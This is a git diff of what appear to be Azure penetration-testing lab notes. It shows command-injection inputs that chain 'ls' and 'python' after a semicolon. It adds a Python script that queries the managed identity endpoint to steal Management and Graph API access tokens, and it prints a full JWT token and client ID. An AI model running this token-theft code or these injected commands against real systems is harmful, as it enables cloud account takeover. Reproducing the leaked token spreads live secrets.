@@ -474,7 +474,29 @@ a lot of the time the EndOfLine or Special Character is a ```;``` - so just put 
 ; ls /tmp/uploads/studentx;
 ; python /tmp/uploads/studentx/studentx.py;
 ```
+The python script is the same ```curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com``` with ```popen``` command we have performed previously:
+```
+import os
+import json
 
+IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
+IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
+
+cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+
+val = os.popen(cmd).read()
+
+print("[+] Management API")
+print("Access Token: "+json.loads(val)["access_token"])
+print("ClientID: "+json.loads(val)["client_id"])
+
+cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
+
+val = os.popen(cmd).read()
+print("\r\n[+] Graph API")
+print("Access Token: "+json.loads(val)["access_token"])
+print("ClientID: "+json.loads(val)["client_id"])
+```
 
 we are returned:
 ```
@@ -486,3 +508,5 @@ ClientID: 62e44426-5c46-4e3c-8a89-f461d5d586f2
 Access Token: eyJ0eXAiOiJKV1QiLCJub25jZSI6InpSRnZKbjB6OGlQbWRJa2RUYzBNTHRibGFhTnhJWlFCRmdzWVVPaVZpQWciLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1HTHFqOThWTkxvWGFGZnBKQ0JwZ0I0SmFLcyIsImtpZCI6Ik1HTHFqOThWTkxvWGFGZnBKQ0JwZ0I0SmFLcyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTcyMDQ5MDA4NSwibmJmIjoxNzIwNDkwMDg1LCJleHAiOjE3MjA1NzY3ODUsImFpbyI6IkUyZGdZRmdhdFRSTHFlWnpUa1YxN3ZMVEJSOGVBQUE9IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0Z01BQUFBQUFBQUF3QUFBQUFBQUFBREVBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiSFo1cFF1WXBuRXl3anpKZk1fY2lBQSIsInZlciI6IjEuMCIsIndpZHMiOlsiMDk5N2ExZDAtMGQxZC00YWNiLWI0MDgtZDVjYTczMTIxZTkwIl0sInhtc19pZHJlbCI6IjE0IDciLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.cpVi_gLxGY9iX_80uLjJcwe8L1wEdhDcsu377zknhtxsrVuMr7yjG4NLvorPs_iiENk_YA2D_O_4njHp2-iZ-ZmY8kS-HODC5IqFwaHdrMr2Y3uz2Gq4wcjCJI4uNMzrAIl6an2q4_t9bYPVWuQwNvOY756rVlN1xKWwAZdDVF6DqJJX4ZztUDolaa7ZxtL7yvx1Erl7VFjhHFqoEHMIqKEyVdzt2OHj20JckkHm5KTef0NylcDvwYPdRZBsUuue_3qXYkYq6hw6t-ILc6Wg-VDH-uWb-uojMXbmnS779TRxZ-5JgOBRnuJ1yQBQ4d2Z_9gQmTYhvCVrucF-lH_RjA
 ClientID: 62e44426-5c46-4e3c-8a89-f461d5d586f2
 ```
+
+
